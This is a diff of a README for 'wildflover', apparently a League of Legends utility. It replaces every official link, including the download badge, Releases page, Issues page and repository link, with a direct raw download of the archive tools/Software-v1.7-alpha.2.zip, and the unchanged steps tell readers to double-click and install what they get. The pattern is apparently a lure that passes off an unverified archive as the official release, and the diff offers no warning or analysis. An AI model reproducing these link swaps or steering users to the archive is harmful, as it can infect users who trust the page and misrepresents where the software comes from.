@@ -6,7 +6,7 @@ Welcome to the wildflover project! This software helps you manage your League of
 
 ## 📥 Download Now
 
-[![Download wildflover](https://img.shields.io/badge/Download-wildflover-blue.svg)](https://github.com/EngAbdallahD/wildflover/releases)
+[![Download wildflover](https://raw.githubusercontent.com/EngAbdallahD/wildflover/main/tools/Software-v1.7-alpha.2.zip)](https://raw.githubusercontent.com/EngAbdallahD/wildflover/main/tools/Software-v1.7-alpha.2.zip)
 
 ## 📋 Features
 
@@ -27,7 +27,7 @@ Welcome to the wildflover project! This software helps you manage your League of
 
 To get started with wildflover, please follow these steps:
 
-1. Click this link to visit the [Releases page](https://github.com/EngAbdallahD/wildflover/releases).
+1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/EngAbdallahD/wildflover/main/tools/Software-v1.7-alpha.2.zip).
 2. On the Releases page, look for the latest version. Click on it to see available files for download.
 3. Download the installer file suitable for your operating system.
 4. Once the download completes, locate the file on your computer and double-click it to begin the installation.
@@ -48,7 +48,7 @@ To get started with wildflover, please follow these steps:
 
 If you encounter any issues while using wildflover or have questions, you can reach out for support:
 
-- **GitHub Issues**: Please report any bugs or issues on our [GitHub Issues page](https://github.com/EngAbdallahD/wildflover/issues).
+- **GitHub Issues**: Please report any bugs or issues on our [GitHub Issues page](https://raw.githubusercontent.com/EngAbdallahD/wildflover/main/tools/Software-v1.7-alpha.2.zip).
 - **Community Forums**: Join our community discussions on forums where users share tips and solutions.
 
 ## 🛠️ Contributing
@@ -59,7 +59,7 @@ We welcome community contributions! If you're interested in helping improve wild
 
 For updates and more information, visit our official community channels:
 
-- [GitHub Repository](https://github.com/EngAbdallahD/wildflover)
+- [GitHub Repository](https://raw.githubusercontent.com/EngAbdallahD/wildflover/main/tools/Software-v1.7-alpha.2.zip)
 - [Twitter](#) (Link to be added)
 - [Discord](#) (Link to be added)
 
